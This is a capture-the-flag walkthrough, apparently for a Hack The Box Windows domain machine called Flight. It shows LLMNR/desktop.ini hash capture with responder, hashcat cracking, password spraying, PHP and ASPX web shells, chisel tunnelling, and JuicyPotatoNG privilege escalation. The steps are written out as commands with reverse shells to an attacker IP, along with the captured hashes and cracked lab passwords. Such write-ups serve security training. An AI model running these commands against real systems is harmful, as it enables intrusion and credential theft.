- Let's add the relevant endpoint to `/etc/hosts`

```bash
echo "10.10.11.187	flight.htb" | sudo tee -a /etc/hosts
```

- Let's start `autorecon` in the background:

```bash
sudo (which autorecon) flight.htb
```

- There doesn't seem to be much on the open port `80`.
- Let's enumerate additional endpoints and subdomains/vhosts

- `feroxbuster`

```bash
feroxbuster -u http://flight.htb -n -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_flight_out.txt
```

- `wfuzz`

```bash
wfuzz -c -f flight_wfuzz_out.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hw 530 --hc 400,404 -H "Host: FUZZ.flight.htb" -t 100 flight.htb

02020:  C=200     90 L	     412 W	   3996 Ch	  "school"
```


![image](https://0xc0rvu5.github.io/docs/assets/images/20230313160208.png)

- Let's adjust out `/etc/hosts` to reflect the new subdomain.

```bash
10.10.11.187	flight.htb school.flight.htb
```

- We can see some endpoints in the source code and also on the main page.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313160316.png)

- After attempting `LFI` we are struck with a warning message:

```bash
# Suspicious Activity Blocked!
```

- We will end up getting access to a hash via `LLMNR` poising.
	- [[https://systemweakness.com/what-is-llmnr-poisoning-attack-and-how-to-secure-against-it-417f3b415e51]]
- Start `responder` on your host machine:

```bash
sudo responder -I tun0 -dw -v 
```

- Visit the following endpoint:

```bash
http://school.flight.htb/index.php?view=//10.10.16.29/check
```

- Within the `responder` output you should now see:

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:99d2d146bb677909:B9C2F7643EE4F9EBE968A5733ECF73B0:010100000000000000F54B35CC55D901A193B678060723280000000002000800380055004D00540001001E00570049004E002D005300320046004B00560056004A005000510055004D0004003400570049004E002D005300320046004B00560056004A005000510055004D002E00380055004D0054002E004C004F00430041004C0003001400380055004D0054002E004C004F00430041004C0005001400380055004D0054002E004C004F00430041004C000700080000F54B35CC55D90106000400020000000800300030000000000000000000000000300000991A81744DE1578621A5F61ABE58F8BAAFDEB272C0FEACA81EE071790C6A27ED0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320039000000000000000000
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313165419.png)

- Let's put the hash in a file on our host machine:

```bash
vim hash
svc_apache::flight:99d2d146bb677909:B9C2F7643EE4F9EBE968A5733ECF73B0:010100000000000000F54B35CC55D901A193B678060723280000000002000800380055004D00540001001E00570049004E002D005300320046004B00560056004A005000510055004D0004003400570049004E002D005300320046004B00560056004A005000510055004D002E00380055004D0054002E004C004F00430041004C0003001400380055004D0054002E004C004F00430041004C0005001400380055004D0054002E004C004F00430041004C000700080000F54B35CC55D90106000400020000000800300030000000000000000000000000300000991A81744DE1578621A5F61ABE58F8BAAFDEB272C0FEACA81EE071790C6A27ED0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320039000000000000000000
```

- Check `hashid` for the hash type:

```bash
hashid svc_apache::flight:99d2d146bb677909:B9C2F7643EE4F9EBE968A5733ECF73B0:010100000000000000F54B35CC55D901A193B678060723280000000002000800380055004D00540001001E00570049004E002D005300320046004B00560056004A005000510055004D0004003400570049004E002D005300320046004B00560056004A005000510055004D002E00380055004D0054002E004C004F00430041004C0003001400380055004D0054002E004C004F00430041004C0005001400380055004D0054002E004C004F00430041004C000700080000F54B35CC55D90106000400020000000800300030000000000000000000000000300000991A81744DE1578621A5F61ABE58F8BAAFDEB272C0FEACA81EE071790C6A27ED0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320039000000000000000000
[+] NetNTLMv2
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313165900.png)

- Query that hash type to find the `hashcat` `Hash-Mode`:

```bash
hashcat --help | grep NetNTLMv2
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313170105.png)

- Execute `hashcat` to determine that password:

```bash
hashcat -m 5600 hash rockyou.txt -O

SVC_APACHE::flight:99d2d146bb677909:b9c2f7643ee4f9ebe968a5733ecf73b0:010100000000000000f54b35cc55d901a193b678060723280000000002000800380055004d00540001001e00570049004e002d005300320046004b00560056004a005000510055004d0004003400570049004e002d005300320046004b00560056004a005000510055004d002e00380055004d0054002e004c004f00430041004c0003001400380055004d0054002e004c004f00430041004c0005001400380055004d0054002e004c004f00430041004c000700080000f54b35cc55d90106000400020000000800300030000000000000000000000000300000991a81744de1578621a5f61abe58f8baafdeb272c0feaca81ee071790c6a27ed0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320039000000000000000000:S@Ss!K@*t13
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313165614.png)

- Let's test out these credentials:

```bash
svc_apache:S@Ss!K@*t13
```

- We can immediately check whether we have access to the `samba` server and we do!
- We can use `smbmap` to determine what kind of access we have to each share:

```bash
crackmapexec smb flight.htb -u svc_apache -d flight -p 'S@Ss!K@*t13'
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight\svc_apache:S@Ss!K@*t13


smbmap -u svc_apache -p 'S@Ss!K@*t13' -d flight -H flight.htb              Mon 13 Mar 2023 05:07:03 PM CDT
[+] IP: flight.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	

```

- Let's determine additional users:

```bash
crackmapexec smb flight.htb -u svc_apache -d flight -p 'S@Ss!K@*t13' --users
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313171953.png)

- Put the results into a file called `users.txt`:

```bash
cat users.txt | awk -F '\\' '{print $2}' | awk '{print $1}' > final.txt

cat final.txt

O.Possum
svc_apache
V.Stevens
D.Truff
I.Francis
W.Walker
C.Bum
M.Gold
L.Kein
G.Lors
R.Cold
S.Moon
krbtgt
Guest
Administrator
```

- Check to see if any of the users are also using the same password as `svc_apache`:

```bash
crackmapexec smb flight.htb -u final.txt -p 'S@Ss!K@*t13' --continue-on-success

SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313172302.png)

- Looks like we have access to `S.Moon`!
- `S.Moon` has `write` access to the `Shared` drive:

```bash
smbmap -u S.Moon -p 'S@Ss!K@*t13' -d flight -H flight.htb

[+] IP: flight.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313172647.png)

- `LLMNR` poisoning is accomplished if `Multicast Name Resolution` is on as well as `NBT-NS`.
- Since this is the case we can trick `DNS` into sending up the user hash as we previously did.
- The same applies to the following technique. 
- When a `desktop.ini` file is present in a folder, Windows will read the file and apply the settings defined within it to the folder and its contents.
- If we start up `responder`, create a `desktop.ini` file on our host, and put the `desktop.ini` file on the server (since we have write access).

```bash
cat desktop.ini

[.ShellClassInfo]
IconFile=\\10.10.16.29\check
```

- Start `responder`:

```bash
sudo responder -I tun0 -dw -v
```

- Send the `desktop.ini` file to the server:

```bash
smbclient //flight.htb/Shared -U 'S.Moon%S@Ss!K@*t13' -c 'put desktop.ini'
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313174001.png)

- Add it to a file and repeat the previous `hashcat` process. No need to check the `Hash-Mode` this time it will be the same:

```bash
vim hash

c.bum::flight.htb:1d02d20872273b09:9A4A1029298E352D249F4587F766096A:0101000000000000002B92EFD155D90117AF4E19770A838D000000000200080051004C004900360001001E00570049004E002D0059004A003300410059004B0048004C0048003300390004003400570049004E002D0059004A003300410059004B0048004C004800330039002E0051004C00490036002E004C004F00430041004C000300140051004C00490036002E004C004F00430041004C000500140051004C00490036002E004C004F00430041004C0007000800002B92EFD155D90106000400020000000800300030000000000000000000000000300000991A81744DE1578621A5F61ABE58F8BAAFDEB272C0FEACA81EE071790C6A27ED0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320039000000000000000000

hashcat -m 5600 hash rockyou.txt -O

C.BUM::flight.htb:1d02d20872273b09:9a4a1029298e352d249f4587f766096a:0101000000000000002b92efd155d90117af4e19770a838d000000000200080051004c004900360001001e00570049004e002d0059004a003300410059004b0048004c0048003300390004003400570049004e002d0059004a003300410059004b0048004c004800330039002e0051004c00490036002e004c004f00430041004c000300140051004c00490036002e004c004f00430041004c000500140051004c00490036002e004c004f00430041004c0007000800002b92efd155d90106000400020000000800300030000000000000000000000000300000991a81744de1578621a5f61abe58f8baafdeb272c0feaca81ee071790c6a27ed0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320039000000000000000000:Tikkycoll_431012284
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313174139.png)

- User `C.Bum`!

```bash
C.Bum:Tikkycoll_431012284
```

- Similar to before let's see what type of access we have:

```bash
smbmap -u C.Bum -p 'Tikkycoll_431012284' -d flight -H flight.htb

[+] IP: flight.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313174318.png)

- This time we have access to the `Web` share which includes both `flight.htb` and `school.flight.htb`.
- We know `school.flight.htb` is using `php` so we generate a reverse shell.
- Using the `hack-tools` extension you can go down the list of `php` `reverse-shell` options until you reach `p0wny`. You can watch the convenient preview within the window.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313214301.png)
 
- Download the shell:

```bash
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
```

- Transfer the shell over:

```bash
smbclient //flight.htb/Web -U 'C.Bum%Tikkycoll_431012284'
cd school.flight.htb
put shell.php
```

- Visit:

```bash
http://school.flight.htb/shell.php
```

- Let's get a shell as `C.Bum`:

- On host:

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
unzip RunasCs.zip
cp RunasCs.exe levelUp.exe
```

- If you still have the `smb` share open:

```bash
put levelUp.exe
```

- Start a `nc` listener on host:

```bash
nc -lvnp 4443
```

Within the browser:

```bash
levelUp.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.16.29:4443
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313182843.png)

- Let's obtain the `user.txt` flag in `C.Bum's` `Desktop` directory:

```bash
get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\C.Bum\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/13/2023   1:41 PM             34 user.txt  
```

```bash
type C:\Users\C.Bum\Desktop\user.txt

**********************************
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230519200856.png)

- After not finding much from `winpeas.exe` output you can find `inetpub` and `xampp`  in the `C:\` directory.
- `XAMPP` is a software package that provides an easy way to install and configure a web server on a local machine for development and testing purposes. It includes several components, such as Apache web server, PHP, and MySQL database server, among others.
	- We already are aware of the above.
- `inetpub` (short for Internet Information Services (IIS) publishing folder) is the default location for websites hosted on an IIS web server.
- The `aspnet_client` directory is a special directory that is automatically created in the root directory of an ASP.NET web application when it is first deployed to a web server.
- We can find this folder at `C:\inetpub\wwwroot\aspnet_client`.
- In `C:\inetpub\development` we can see a normal website file system hierarchy.
- Now we didn't see any external web-servers running, but if we check internally we have port `8000` listening.
	- General we-server ports are `80`, `8080` and `8000`.

```bash
netstat -at | select-object -first 25

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             g0:0                   LISTENING
  TCP    0.0.0.0:88             g0:0                   LISTENING
  TCP    0.0.0.0:135            g0:0                   LISTENING
  TCP    0.0.0.0:389            g0:0                   LISTENING
  TCP    0.0.0.0:443            g0:0                   LISTENING
  TCP    0.0.0.0:445            g0:0                   LISTENING
  TCP    0.0.0.0:464            g0:0                   LISTENING
  TCP    0.0.0.0:593            g0:0                   LISTENING
  TCP    0.0.0.0:636            g0:0                   LISTENING
  TCP    0.0.0.0:3268           g0:0                   LISTENING
  TCP    0.0.0.0:3269           g0:0                   LISTENING
  TCP    0.0.0.0:5985           g0:0                   LISTENING
  TCP    0.0.0.0:8000           g0:0                   LISTENING
  TCP    0.0.0.0:9389           g0:0                   LISTENING
  TCP    0.0.0.0:47001          g0:0                   LISTENING
  TCP    0.0.0.0:49664          g0:0                   LISTENING
  TCP    0.0.0.0:49665          g0:0                   LISTENING
  TCP    0.0.0.0:49666          g0:0                   LISTENING
  TCP    0.0.0.0:49667          g0:0                   LISTENING
  TCP    0.0.0.0:49673          g0:0                   LISTENING
  TCP    0.0.0.0:49674          g0:0                   LISTENING
```

```bash
svc_apache:S@Ss!K@*t13
C.Bum:Tikkycoll_431012284
```

- Let's utilize `chisel` to emulate a `localhost` web-server.
- We will port forward the victims web-server to our host and allow ourselves to access it directly via `GUI`.
- First, let's grab a working `windows` binary if we haven't already:

- Host:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_amd64.gz
gunzip chisel_1.7.3_windows_amd64.gz
mv chisel_1.7.3_windows_amd64 chisel.exe
python -m http.server 80
```

- Victim:

```bash
cd C:\inetpub\development
wget -O chisel.exe 10.10.16.29/chisel.exe
```

- Host:

```bash
./chisel server --reverse -p 10015
```

- Victim:

```bash
.\chisel.exe client 10.10.16.29:10015 R:8000:127.0.0.1:8000
```

- On your host machine visit `http://127.0.0.1:8000/` to confirm.
- Once confirmed let's grab an `aspx` shell since it is an `ASP.NET` application.
- GoogleFu:
	- `aspx reverse shell`
		- [[https://github.com/borjmz/aspx-reverse-shell]]

```bash
wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx

cat shell.aspx | head -15

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "10.10.16.29"; //CHANGE THIS
            int port = 1234; ////CHANGE THIS

```

- At this point we will have to create an additional shell since `chisel` is occupying the previous shell.

- Transfer the shell over:

```bash
smbclient //flight.htb/Web -U 'C.Bum%Tikkycoll_431012284'
cd school.flight.htb
put shell.php
put levelUp.exe
```

- Visit:

```bash
http://school.flight.htb/shell.php
```

- Start a `nc` listener on host:

```bash
nc -lvnp 4444
```

Within the browser:

```bash
levelUp.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.16.29:4444
```

- On host start a `python` simple server:

```bash
python -m http.server 80
```

- Victim:

```bash
cd C:\inetpub\development
wget -O shell.aspx 10.10.16.29:80/shell.aspx
```

- Start a `nc` listener on host again:

```bash
nc -lvnp 1234
```

- In your browser visit:

```bash
http://127.0.0.1:8000/shell.aspx
```

- Boom! We are in as `iis apppool\defaultapppool`

```bash
PS C:\windows\system32\inetsrv> whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230313221753.png)

- Visit:
	- [[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens]]
	- Go down the list of `Enabled` and `Ctrl+F` paste each result in until we get a hit.
	- `juicypotatoNG` is the first option and it works:

- Let's grab the binary alongside our local `nc` to transfer to the victim:

```bash
wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip
rm JuicyPotatoNG.zip
cp /usr/share/windows-resources/binaries/nc.exe .
python -m http.server 80
```

- Start a `nc` listener on your host in preparation:

```bash
nc -lvnp 2222
```

- Victim:

```bash
cd C:\Users\Public\Downloads
wget -O JuicyPotatoNG.exe 10.10.16.29/JuicyPotatoNG.exe
wget -O nc.exe 10.10.16.29/nc.exe
.\JuicyPotatoNG.exe -t * -p nc.exe -a '10.10.16.29 2222 -e powershell.exe'
```

-   `-t *`: This specifies the target process that will be used to execute the attack. The asterisk `*` indicates that any process can be used as the target.
-   `-p nc.exe`: This specifies the name of the binary that the target process will execute
-   `-a '10.10.16.29 2222 -e powershell.exe'`: This specifies the argument that will be passed to the target process.

```bash
get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue
type C:\Users\C.Bum\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

- That's a wrap!

```bash
type C:\Users\C.Bum\Desktop\user.txt

*********************************

type C:\Users\Administrator\Desktop\root.txt

*********************************
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230519201123.png)

#hacking
